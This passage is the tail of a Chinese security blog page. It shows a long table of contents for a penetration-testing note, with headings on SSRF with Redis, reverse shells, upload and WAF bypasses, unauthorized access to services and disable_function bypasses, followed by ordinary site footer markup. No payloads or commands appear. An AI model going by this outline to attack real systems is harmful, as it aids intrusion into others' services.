class="toc-number">2.45.1.8.2.</span> <span class="toc-text">成因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8C%96%E6%8E%98-1"><span class="toc-number">2.45.1.8.3.</span> <span class="toc-text">挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#XML-1"><span class="toc-number">2.45.1.8.3.1.</span> <span class="toc-text">XML</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.45.1.8.3.2.</span> <span class="toc-text">数据库</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#MongoDB"><span class="toc-number">2.45.1.8.3.3.</span> <span class="toc-text">MongoDB</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#PostgresSQL"><span class="toc-number">2.45.1.8.3.4.</span> <span class="toc-text">PostgresSQL</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#MSSQL"><span class="toc-number">2.45.1.8.3.5.</span> <span class="toc-text">MSSQL</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0"><span class="toc-number">2.45.1.8.3.6.</span> <span class="toc-text">图片处理函数</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-number">2.45.1.8.4.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.45.1.8.4.1.</span> <span class="toc-text">文件读取</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.45.1.8.5.</span> <span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#SSRF-Redis"><span class="toc-number">2.45.1.8.5.1.</span> <span class="toc-text">SSRF+Redis</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#302%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.45.1.8.5.2.</span> <span class="toc-text">302反弹shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Mysql"><span class="toc-number">2.45.1.8.5.3.</span> <span class="toc-text">Mysql</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Weblogic-SSRF-Redis"><span class="toc-number">2.45.1.8.5.4.</span> <span class="toc-text">Weblogic SSRF+Redis</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Ueditor-SSRF"><span class="toc-number">2.45.1.8.5.5.</span> <span class="toc-text">Ueditor SSRF</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Discuz"><span class="toc-number">2.45.1.8.5.6.</span> <span class="toc-text">Discuz</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">2.45.1.8.5.7.</span> <span class="toc-text">探测存活主机</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">2.45.1.8.5.8.</span> <span class="toc-text">绕过方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%84%9A%E6%9C%AC%E8%BD%AC%E6%8D%A2"><span class="toc-number">2.45.1.8.5.9.</span> <span class="toc-text">gopher协议的脚本转换</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.45.1.8.5.10.</span> <span class="toc-text">协议</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#dict%E5%8D%8F%E8%AE%AE%E5%86%99shell"><span class="toc-number">2.45.1.8.5.11.</span> <span class="toc-text">dict协议写shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#slaveof%E5%A4%8D%E5%88%B6shell%E5%88%B0%E7%9B%AE%E6%A0%87"><span class="toc-number">2.45.1.8.5.12.</span> <span class="toc-text">slaveof复制shell到目标</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#slaveof%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.45.1.8.5.13.</span> <span class="toc-text">slaveof反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fuzz-%E6%89%AB%E6%8F%8Fweb"><span class="toc-number">2.45.1.9.</span> <span class="toc-text">Fuzz&#x2F;扫描web</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#WFuzz"><span class="toc-number">2.45.1.9.1.</span> <span class="toc-text">WFuzz</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cewl"><span class="toc-number">2.45.1.9.2.</span> <span class="toc-text">Cewl</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Dirsearch"><span class="toc-number">2.45.1.9.3.</span> <span class="toc-text">Dirsearch</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass-WAF"><span class="toc-number">2.45.1.10.</span> <span class="toc-text">Bypass WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93"><span class="toc-number">2.45.1.10.1.</span> <span class="toc-text">SQL注入分块传输</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BE%9B%E5%8F%AF%E7%94%A8%E7%9A%84tamper"><span class="toc-number">2.45.1.10.2.</span> <span class="toc-text">自动提供可用的tamper</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="toc-number">2.45.1.10.3.</span> <span class="toc-text">垃圾数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0bypass"><span class="toc-number">2.45.1.10.4.</span> <span class="toc-text">上传bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="toc-number">2.45.1.10.4.1.</span> <span class="toc-text">图片文件头</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%9B%BE%E7%89%87%E5%A4%B4%E6%88%96%E5%90%88%E5%B9%B6%E5%9B%BE%E7%89%87%E5%8C%85%E5%90%AB"><span class="toc-number">2.45.1.10.4.2.</span> <span class="toc-text">添加图片头或合并图片包含</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%90%8E%E7%BC%80%E5%A4%A7%E5%B0%8F%E5%86%99"><span class="toc-number">2.45.1.10.4.3.</span> <span class="toc-text">后缀大小写</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%89%8D%E7%BC%80%E5%8A%A0-0x09"><span class="toc-number">2.45.1.10.4.4.</span> <span class="toc-text">文件名前缀加[0x09]</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0-htaccess"><span class="toc-number">2.45.1.10.4.5.</span> <span class="toc-text">上传.htaccess</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-number">2.45.1.10.4.6.</span> <span class="toc-text">二次渲染</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0php3-php4-phtml%E7%AD%89"><span class="toc-number">2.45.1.10.4.7.</span> <span class="toc-text">上传php3,php4,phtml等</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%90%8E%E5%8A%A0-DATA"><span class="toc-number">2.45.1.10.4.8.</span> <span class="toc-text">文件名后加::$DATA</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#asp-%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.45.1.10.4.9.</span> <span class="toc-text">asp . (空格+.)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#php-%E7%82%B9-%E7%A9%BA%E6%A0%BC-%E7%82%B9"><span class="toc-number">2.45.1.10.4.10.</span> <span class="toc-text">php. .(点+空格+点)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%8C%E5%86%99phphpp"><span class="toc-number">2.45.1.10.4.11.</span> <span class="toc-text">双写phphpp</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-number">2.45.1.10.4.12.</span> <span class="toc-text">00截断</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E4%B8%80%E4%BA%9B%E5%9B%BA%E5%AE%9A%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">2.45.1.10.4.13.</span> <span class="toc-text">修改一些固定的参数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%8E%BB%E6%8E%89%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="toc-number">2.45.1.10.4.14.</span> <span class="toc-text">文件名去掉双引号</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8A%A0%E4%B8%80%E4%B8%AAfilename1%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">2.45.1.10.4.15.</span> <span class="toc-text">加一个filename1的参数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#form%E5%8F%98%E9%87%8F%E6%94%B9%E6%88%90f-orm"><span class="toc-number">2.45.1.10.4.16.</span> <span class="toc-text">form变量改成f+orm</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8E%BB%E6%8E%89form-data"><span class="toc-number">2.45.1.10.4.17.</span> <span class="toc-text">去掉form-data</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9C%A8Content-Disposition%E6%88%96form-data-%E5%90%8E%E6%B7%BB%E5%8A%A0%E5%A4%9A%E4%B8%AA%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.45.1.10.4.18.</span> <span class="toc-text">在Content-Disposition或form-data;后添加多个空格</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7%E5%9B%9E%E8%BD%A6"><span class="toc-number">2.45.1.10.4.19.</span> <span class="toc-text">引号回车</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Content-Type%E5%92%8CConTent-Disposition%E8%B0%83%E6%8D%A2%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.45.1.10.4.20.</span> <span class="toc-text">Content-Type和ConTent-Disposition调换位置</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%89%8D%E7%BC%80%E5%8A%A0%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.45.1.10.4.21.</span> <span class="toc-text">文件名前缀加空格</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#name%E5%89%8D%E5%8A%A0%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.45.1.10.4.22.</span> <span class="toc-text">name前加空格</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#form-data%E7%9A%84%E5%89%8D%E5%90%8E%E5%8A%A0%E4%B8%8A"><span class="toc-number">2.45.1.10.4.23.</span> <span class="toc-text">form-data的前后加上+</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ASP-IIS"><span class="toc-number">2.45.1.10.5.</span> <span class="toc-text">ASP+IIS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Asp-iis-amp-aspx-iis"><span class="toc-number">2.45.1.10.6.</span> <span class="toc-text">Asp+iis&amp;aspx+iis</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#apache"><span class="toc-number">2.45.1.10.7.</span> <span class="toc-text">apache</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99-%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">2.45.1.10.8.</span> <span class="toc-text">大小写&#x2F;关键字</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8C%E9%87%8Durl%E7%BC%96%E7%A0%81"><span class="toc-number">2.45.1.10.9.</span> <span class="toc-text">双重url编码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%98%E6%8D%A2%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="toc-number">2.45.1.10.10.</span> <span class="toc-text">变换请求方式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">2.45.1.10.11.</span> <span class="toc-text">HPP参数污染</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-1"><span class="toc-number">2.45.1.10.12.</span> <span class="toc-text">数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Access"><span class="toc-number">2.45.1.10.12.1.</span> <span class="toc-text">Access</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Mysql-1"><span class="toc-number">2.45.1.10.12.2.</span> <span class="toc-text">Mysql</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#MSSQL-1"><span class="toc-number">2.45.1.10.12.3.</span> <span class="toc-text">MSSQL</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WAF"><span class="toc-number">2.45.1.10.13.</span> <span class="toc-text">WAF</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.45.1.11.</span> <span class="toc-text">未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.45.1.11.1.</span> <span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">2.45.1.11.1.1.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#JS%E6%89%93%E5%86%85%E7%BD%91"><span class="toc-number">2.45.1.11.1.2.</span> <span class="toc-text">JS打内网</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.45.1.11.1.3.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%99shell"><span class="toc-number">2.45.1.11.1.4.</span> <span class="toc-text">写shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#SSH"><span class="toc-number">2.45.1.11.1.5.</span> <span class="toc-text">SSH</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#redis-rogue-getshell"><span class="toc-number">2.45.1.11.1.6.</span> <span class="toc-text">redis-rogue-getshell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#redis-rogue-server"><span class="toc-number">2.45.1.11.1.7.</span> <span class="toc-text">redis-rogue-server</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#redis%E5%9C%A8windows%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.45.1.11.1.8.</span> <span class="toc-text">redis在windows下的利用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Lua-RCE"><span class="toc-number">2.45.1.11.1.9.</span> <span class="toc-text">Lua RCE</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.45.1.11.2.</span> <span class="toc-text">Jenkins未授权访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.45.1.11.3.</span> <span class="toc-text">MongoDB未授权访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ZooKeeper%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.45.1.11.4.</span> <span class="toc-text">ZooKeeper未授权访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Elasticsearch%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.45.1.11.5.</span> <span class="toc-text">Elasticsearch未授权访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.45.1.11.6.</span> <span class="toc-text">Memcache未授权访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.45.1.11.7.</span> <span class="toc-text">Hadoop未授权访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Docker%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.45.1.11.8.</span> <span class="toc-text">Docker未授权访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ActiveMQ%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.45.1.11.9.</span> <span class="toc-text">ActiveMQ未授权访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JBOSS%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.45.1.11.10.</span> <span class="toc-text">JBOSS未授权访问</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%BF%E9%87%8C%E4%BA%91OSS-Key%E5%88%A9%E7%94%A8"><span class="toc-number">2.45.1.12.</span> <span class="toc-text">阿里云OSS Key利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E7%BB%95%E8%BF%87disable-function"><span class="toc-number">2.45.1.13.</span> <span class="toc-text">Linux绕过disable_function</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#LD-PRELOAD"><span class="toc-number">2.45.1.13.1.</span> <span class="toc-text">LD_PRELOAD</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php7-0-7-3-bypass"><span class="toc-number">2.45.1.13.2.</span> <span class="toc-text">php7.0-7.3 bypass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#windows%E7%B3%BB%E7%BB%9F%E7%BB%84%E4%BB%B6com%E7%BB%95%E8%BF%87"><span class="toc-number">2.45.1.13.3.</span> <span class="toc-text">windows系统组件com绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CGI%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.45.1.13.4.</span> <span class="toc-text">CGI启动方式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ImageMagick%E7%BB%84%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-number">2.45.1.13.5.</span> <span class="toc-text">ImageMagick组件绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">2.45.1.13.6.</span> <span class="toc-text">常规函数绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#pcntl-exec"><span class="toc-number">2.45.1.13.7.</span> <span class="toc-text">pcntl_exec</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#imap-open%E5%87%BD%E6%95%B0"><span class="toc-number">2.45.1.13.8.</span> <span class="toc-text">imap_open函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php7-4-FFI%E7%BB%95%E8%BF%87"><span class="toc-number">2.45.1.13.9.</span> <span class="toc-text">php7.4 FFI绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#shellshock"><span class="toc-number">2.45.1.13.10.</span> <span class="toc-text">shellshock</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6"><span class="toc-number">2.45.1.13.11.</span> <span class="toc-text">蚁剑插件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#open-basedir%E7%BB%95%E8%BF%87"><span class="toc-number">2.45.1.14.</span> <span class="toc-text">open_basedir绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tomcat-Ajp-LFI-amp-RCE"><span class="toc-number">2.45.1.15.</span> <span class="toc-text">Tomcat Ajp LFI&amp;RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.45.1.16.</span> <span class="toc-text">Mysql连接文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql%E5%BC%80%E5%90%AF%E5%A4%96%E8%BF%9E"><span class="toc-number">2.45.1.17.</span> <span class="toc-text">Mysql开启外连</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSSQL-amp-Agent-Job%E4%B8%8A%E7%BA%BF"><span class="toc-number">2.45.1.18.</span> <span class="toc-text">MSSQL&amp;Agent Job上线</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%97%A0%E5%88%97%E5%90%8D"><span class="toc-number">2.45.1.19.</span> <span class="toc-text">注入无列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNSLog"><span class="toc-number">2.45.1.20.</span> <span class="toc-text">DNSLog</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-number">2.45.1.20.1.</span> <span class="toc-text">注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#MYSQL"><span class="toc-number">2.45.1.20.1.1.</span> <span class="toc-text">MYSQL</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#MSSQL-2"><span class="toc-number">2.45.1.20.1.2.</span> <span class="toc-text">MSSQL</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#postgreSQL"><span class="toc-number">2.45.1.20.1.3.</span> <span class="toc-text">postgreSQL</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Oracle"><span class="toc-number">2.45.1.20.1.4.</span> <span class="toc-text">Oracle</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.45.1.20.2.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XXE-1"><span class="toc-number">2.45.1.20.3.</span> <span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Struts"><span class="toc-number">2.45.1.20.4.</span> <span class="toc-text">Struts</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/02/14/%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B01/" title="知识笔记1"><img src="https://tva4.sinaimg.cn/large/0072Vf1pgy1foxk6v6t1kj31kw0w0e6l.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="知识笔记1"/></a><div class="content"><a class="title" href="/2022/02/14/%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B01/" title="知识笔记1">知识笔记1</a><time datetime="2022-02-14T02:18:55.000Z" title="发表于 2022-02-14 10:18:55">2022-02-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/05/Google-Hacking/" title="Google Hacking"><img src="https://tva3.sinaimg.cn/large/0072Vf1pgy1foxlhn4alzj31hc0u0aq3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Google Hacking"/></a><div class="content"><a class="title" href="/2022/02/05/Google-Hacking/" title="Google Hacking">Google Hacking</a><time datetime="2022-02-05T10:14:00.000Z" title="发表于 2022-02-05 18:14:00">2022-02-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 猫猫</div><div class="footer_custom_text"><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://www.jsdelivr.com/"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p><a href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referral" rel="external nofollow" target="_blank"><img style="vertical-align:middle" src="https://pic.heson10.com/wallpapers/yun_logo6.png" class=" lazyloaded" data-srcset="https://cdn.jsdelivr.net/gh/nek0neko/ImageHost/yun_logo6.png" srcset="https://cdn.jsdelivr.net/gh/nek0neko/ImageHost/yun_logo6.png"></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>